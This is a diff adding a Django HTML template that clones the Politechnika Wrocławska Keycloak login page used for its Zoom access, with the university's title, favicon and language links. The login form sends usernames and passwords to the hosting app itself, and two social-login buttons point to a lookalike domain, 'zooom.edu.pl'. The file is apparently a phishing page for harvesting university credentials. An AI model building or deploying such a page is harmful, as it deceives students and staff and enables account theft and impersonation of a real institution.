@@ -1,0 +1,98 @@
+{% load static %}
+<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
+<!-- saved from url=(0014)about:internet -->
+<html xmlns="http://www.w3.org/1999/xhtml" class="login-pf"><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
+    
+    
+    <meta name="robots" content="noindex, nofollow">
+
+            <meta name="viewport" content="width=device-width,initial-scale=1">
+    <title>Zaloguj się do Serwer uwierzytelniania Politechniki Wrocławskiej</title>
+    <link rel="icon" href="https://kc.e-science.pl/auth/resources/cg7hc/login/pwr/img/favicon.ico">
+            <link href="{% static 'patternfly.min.css' %}" rel="stylesheet">
+            <link href="{% static 'patternfly-additions.min.css' %}" rel="stylesheet">
+            <link href="{% static 'zocial.css' %}" rel="stylesheet">
+            <link href="{% static 'login.css' %}" rel="stylesheet">
+</head>
+
+<body class="">
+  <div class="login-pf-page">
+    <div id="kc-header" class="login-pf-page-header">
+      <div id="kc-header-wrapper" class="">Serwer uwierzytelniania Politechniki Wrocławskiej</div>
+    </div>
+    <div class="card-pf login-pf-accounts">
+      <header class="login-pf-header">
+            <div id="kc-locale">
+                <div id="kc-locale-wrapper" class="">
+                    <div class="kc-dropdown" id="kc-locale-dropdown">
+                        <a href="https://kc.e-science.pl/auth/realms/pwr.edu.pl/login-actions/authenticate?client_id=pwr-edu.zoom.us&amp;tab_id=T_Vymxjd6gc#" id="kc-current-locale-link">Polski</a>
+                        <ul>
+                                <li class="kc-dropdown-item"><a href="https://kc.e-science.pl/auth/realms/pwr.edu.pl/login-actions/authenticate?client_id=pwr-edu.zoom.us&amp;tab_id=T_Vymxjd6gc&amp;execution=735b4b42-48f5-4d46-a54a-f9d17b2bbca3&amp;kc_locale=de">Deutsch</a></li>
+                                <li class="kc-dropdown-item"><a href="https://kc.e-science.pl/auth/realms/pwr.edu.pl/login-actions/authenticate?client_id=pwr-edu.zoom.us&amp;tab_id=T_Vymxjd6gc&amp;execution=735b4b42-48f5-4d46-a54a-f9d17b2bbca3&amp;kc_locale=en">English</a></li>
+                                <li class="kc-dropdown-item"><a href="https://kc.e-science.pl/auth/realms/pwr.edu.pl/login-actions/authenticate?client_id=pwr-edu.zoom.us&amp;tab_id=T_Vymxjd6gc&amp;execution=735b4b42-48f5-4d46-a54a-f9d17b2bbca3&amp;kc_locale=pl">Polish</a></li>
+                                <li class="kc-dropdown-item"><a href="https://kc.e-science.pl/auth/realms/pwr.edu.pl/login-actions/authenticate?client_id=pwr-edu.zoom.us&amp;tab_id=T_Vymxjd6gc&amp;execution=735b4b42-48f5-4d46-a54a-f9d17b2bbca3&amp;kc_locale=es">Español</a></li>
+                        </ul>
+                    </div>
+                </div>
+            </div>
+                <h1 id="kc-page-title">        Logowanie
+
+</h1>
+      </header>
+      <div id="kc-content">
+        <div id="kc-content-wrapper">
+
+
+    <div id="kc-form" class="row">
+      <div id="kc-form-wrapper" class="col-xs-12 col-sm-6 login-pf-social-section">
+            <form id="kc-form-login" onsubmit="login.disabled = true; return true;" action="" method="post">
+                {% csrf_token %}
+                <div class="form-group">
+                    <label for="username" class="control-label">Nazwa użytkownika lub e-mail (login)</label>
+
+                        <input tabindex="1" id="username" class="form-control" name="username" value="" type="text" autofocus="" autocomplete="off">
+                </div>
+
+                <div class="form-group">
+                    <label for="password" class="control-label">Hasło</label>
+                    <input tabindex="2" id="password" class="form-control" name="password" type="password" autocomplete="off">
+                </div>
+
+                <div class="form-group login-pf-settings">
+                    <div id="kc-form-options">
+                        </div>
+                        <div class="">
+                        </div>
+
+                  </div>
+
+                  <div id="kc-form-buttons" class="form-group">
+                      <input type="hidden" id="id-hidden-input" name="credentialId">
+                      <input tabindex="4" class="btn btn-primary btn-block btn-lg" name="login" id="kc-login" type="submit" value="Logowanie">
+                  </div>
+            </form>
+        </div>
+            <div id="kc-social-providers" class="col-xs-12 col-sm-6 login-pf-social-section">
+                <ul class="login-pf-social list-unstyled login-pf-social-all ">
+                        <li class="login-pf-social-link"><a href="https://login.zooom.edu.pl/auth/realms/pwr.edu.pl/protocol/openid-connect/auth&scope=openid&state=qE2aTTv-VBNe-6ib3y0xVDlX-Ju47Uf3kjausEh1bls.uXwpD3WSNWE.pwr-edu.zoom.us&response_type=code&client_id=kc2login&redirect_uri=httpsFkc.e-science.pl&FauthFrealms&pwr.edu.pl&Fbroker&Flogin-pwr&Fendpoint&nonce=qJj06Qqv2r51Fes2JxuUgA/" id="zocial-login-pwr" class="zocial keycloak-oidc"> <span>Nowy system uwierzytelniania</span></a></li>
+                        <li class="login-pf-social-link"><a href="https://login.zooom.edu.pl/o/oauth2/v2/auth/identifier&scope=openid&20profile&20email&state=Csaf5C-9i6ju1VN6qDXIekEk7nZmQzHANmSgdskWLhc.25S6-J_DlAE.pwr-edu.zoom.us&response_type=code&client_inL9rDU9p3jSQeul8jA&hd=student.pwr.edu.pl&flowName=GeneralOAuthFlo/" id="zocial-google" class="zocial google"> <span>Google</span></a></li>
+                        <li class="login-pf-social-link"><a href="https://kc.e-science.pl/auth/realms/pwr.edu.pl/broker/AD_PWr/login?client_id=pwr-edu.zoom.us&amp;tab_id=T_Vymxjd6gc&amp;session_code=cMY8wnnHnmgplDmOkItm9cN8bvnXZaMh7VDElQK4kLs" id="zocial-AD_PWr" class="zocial keycloak-oidc"> <span>Administracja Centrala PWr</span></a></li>
+                </ul>
+            </div>
+      </div>
+
+
+
+              <div id="kc-info" class="login-pf-signup">
+                  <div id="kc-info-wrapper" class="">
+
+                  </div>
+              </div>
+        </div>
+      </div>
+
+    </div>
+  </div>
+
+
+</body></html>
